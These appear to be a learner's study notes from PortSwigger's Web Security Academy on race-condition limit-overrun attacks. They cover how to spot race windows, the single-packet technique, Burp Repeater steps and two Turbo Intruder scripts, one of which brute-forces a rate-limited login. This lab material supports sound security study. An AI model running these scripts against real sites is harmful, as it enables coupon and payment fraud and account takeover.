# Race Conditions — Part 1: Limit Overrun
**Source:** PortSwigger Web Security Academy
**Status:** ✅ Completed
**Date:** September 2026
**Author:** [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py)

---

## Table of Contents
1. [What is a Race Condition?](#what-is-a-race-condition)
2. [How to Identify Race Windows](#how-to-identify-race-windows)
3. [Limit Overrun Attack](#limit-overrun-attack)
4. [Single-Packet Attack](#single-packet-attack)
5. [Burp Repeater Method](#burp-repeater-method)
6. [Turbo Intruder Method](#turbo-intruder-method)
7. [Benchmarking Methodology](#benchmarking-methodology)
8. [Quick Reference](#quick-reference)

---

## What is a Race Condition?

A race condition occurs when an application processes multiple requests simultaneously and the outcome depends on the timing of those requests — creating a window where security controls can be bypassed.

**Core pattern:**
```
Step 1: CHECK   → is this allowed?
Step 2: ACT     → perform the action
Step 3: UPDATE  → record that it happened

Race window = gap between CHECK and UPDATE
```

**TOCTOU — Time of Check to Time of Use:**
The formal name for this class of vulnerability. The check happens at one time, the use happens at another — and the gap between them is exploitable.

---

## How to Identify Race Windows

### Three Questions to Ask:

**Question 1 — Does this endpoint READ then WRITE the same data?**
```
Read coupon status → Write "used"        ✅ potential
Read account balance → Write new balance ✅ potential
Read token → Write new token             ✅ potential
```

**Question 2 — Can parallel requests affect the SAME record?**
```
Two coupon applies for same order?    ✅ potential
Two password resets for same user?   ✅ potential
Two votes from same account?         ✅ potential
Two different users → different records ❌ unlikely
```

**Question 3 — Is there a state change?**
```
Not used → Used       ✅ potential
Unverified → Verified ✅ potential
Locked → Unlocked     ✅ potential
```

### High-Value Targets:
```
✅ Discount / coupon codes
✅ Gift card redemption
✅ Rate-limited login endpoints
✅ OTP / 2FA verification
✅ Transfer / payment endpoints
✅ Rating / voting systems
✅ Email confirmation flows
✅ Any "one time use" feature
✅ CAPTCHA verification
```

### Confirming Collision Potential in Burp:
1. Send request once → record response (benchmark)
2. Send twice sequentially → confirm second is blocked
3. Send twice in parallel → check if protection holds

---

## Limit Overrun Attack

**Flow:**
```
t=0ms: Request 1 → CHECK: coupon used? NO ✅
t=1ms: Request 2 → CHECK: coupon used? NO ✅  (before update!)
t=2ms: Request 1 → ACT: apply discount
t=3ms: Request 2 → ACT: apply discount  ← both applied!
t=4ms: Request 1 → UPDATE: mark as used
t=5ms: Request 2 → UPDATE: mark as used (already marked)
```

**Common variations:**
```
→ Redeeming gift card multiple times
→ Rating a product multiple times
→ Withdrawing more than account balance
→ Reusing single CAPTCHA solution
→ Bypassing anti-brute-force rate limit
→ Applying referral bonus multiple times
```

---

## Single-Packet Attack

Burp Suite's solution to network jitter — bundles multiple requests into ONE TCP packet.

**HTTP/1 — Last-byte synchronization:**
Hold final byte of each request → release all simultaneously

**HTTP/2 — Single-packet attack:**
Bundle 20-30 requests into single TCP packet → server processes all at exact same moment

```
Normal (affected by jitter):
Request 1 ──────────► arrives at 100ms
Request 2 ───────────────► arrives at 115ms  ← too late!

Single-packet attack:
[R1 + R2 + R3...R20] ──► arrives at 100ms (all together!)
                          server processes simultaneously ✅
```

---

## Burp Repeater Method

```
Step 1: Intercept target request → Send to Repeater

Step 2: Right click tab → Add to group → Create new group

Step 3: Right click group → Duplicate tab (make 10-20 copies)

Step 4: Click dropdown next to Send button
        → Select "Send group in parallel" ⚡

Step 5: Analyse responses
        → Look for any deviation from benchmark
```

**What to look for in responses:**
```
→ Different status codes
→ Unexpected success messages
→ Rate limit not triggered
→ Discount applied twice
→ Different response times
→ Error messages revealing sub-states
```

---

## Turbo Intruder Method

Use for: multiple retries, staggered timing, large request volumes

**Race condition script:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,   # ONE connection = single-packet!
        engine=Engine.BURP2        # HTTP/2 required
    )

    # Queue 20 requests behind gate
    for i in range(20):
        engine.queue(target.req, gate='1')

    # Release all simultaneously
    engine.openGate('1')
```

**Brute force rate-limited login:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    for word in open('/path/to/passwords.txt'):
        engine.queue(target.req, word.rstrip(), gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)   # 302 = successful login!
```

**Key parameters explained:**
```
concurrentConnections=1  → forces single TCP connection
                           all requests share one pipe
                           enables single-packet attack

engine=Engine.BURP2      → HTTP/2 engine
                           required for single-packet attack
                           HTTP/1 won't work!

gate='1'                 → holds requests until openGate()
                           like runners behind starting line

engine.openGate('1')     → releases ALL held requests
                           simultaneously!
```

---

## Benchmarking Methodology

**Always benchmark before attacking:**

```
Step 1: Send group in sequence (SEPARATE connections)
        → Records normal sequential behaviour
        → Establishes baseline responses

Step 2: Send group in parallel
        → Compare to baseline
        → Any deviation = potential race condition
```

**Clues to look for:**
```
→ Response differs from others in the group
→ Action succeeded when it should be blocked
→ Different response times between parallel requests
→ Unexpected error messages
→ Second-order effects (emails, visible UI changes)
→ Rate limit bypassed
```

---

## Quick Reference

```
IDENTIFY RACE WINDOWS
→ Read-then-write endpoints
→ Single-use or rate-limited features
→ State change operations
→ Same database record touched by parallel requests

ATTACK STEPS (Burp Repeater)
1. Send to Repeater
2. Create tab group
3. Duplicate tab 10-20 times
4. Send group in parallel

ATTACK STEPS (Turbo Intruder)
concurrentConnections=1
engine=Engine.BURP2
engine.queue(req, gate='1')
engine.openGate('1')

WHAT TO LOOK FOR
→ Any deviation from benchmark
→ Unexpected success responses
→ Different status codes
→ Rate limit not triggered

HTTP/1  → Last-byte synchronization
HTTP/2  → Single-packet attack (preferred)
```

---

*Part 2: Hidden multi-step sequences, multi-endpoint race conditions, single-endpoint attacks*
*Part 3: Partial construction, session locking bypass, time-sensitive attacks, prevention*

*Notes by [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py) | PortSwigger Web Security Academy*
